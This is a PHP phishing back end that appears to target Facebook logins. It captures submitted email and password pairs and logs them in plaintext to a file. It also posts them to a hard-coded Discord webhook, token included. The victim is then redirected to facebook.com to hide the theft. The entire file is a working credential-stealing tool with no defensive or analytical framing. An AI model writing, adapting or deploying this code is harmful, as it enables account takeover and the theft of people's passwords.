<?php
ob_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    
    $dir_path = "data";
    $file_path = "$dir_path/logins.txt";

    
    if (!is_dir($dir_path)) {
        mkdir($dir_path, 0777, true);
    }

    
    if (!file_exists($file_path)) {
        file_put_contents($file_path, "=== Login Logs ===\n", FILE_APPEND);
    }

    if (!empty($email) && !empty($password)) {
        $log_entry = "Email: $email | Password: $password | Time: " . date("Y-m-d H:i:s") . "\n";
        
        file_put_contents($file_path, $log_entry, FILE_APPEND | LOCK_EX);
        
        sendToDiscord($log_entry);
    }

    header("Location: https://www.facebook.com");
    exit();
}

ob_end_flush(); 

function sendToDiscord($message) {
    $webhook_url = "https://discordapp.com/api/webhooks/1353342049876709446/75SX0g7Eo33o4-9WESMVmW9ak8PYgBPb6wpzw31fPczWl08gynHt5nB2yDVJpYjFDf0k"; // Thay YOUR_WEBHOOK_URL bằng webhook thật của bạn

    $data = [
        "content" => " **Login FB Information**\n```$message```"
    ];

    $options = [
        "http" => [
            "header"  => "Content-Type: application/json",
            "method"  => "POST",
            "content" => json_encode($data),
        ],
    ];

    $context = stream_context_create($options);
    file_get_contents($webhook_url, false, $context);
}
?>
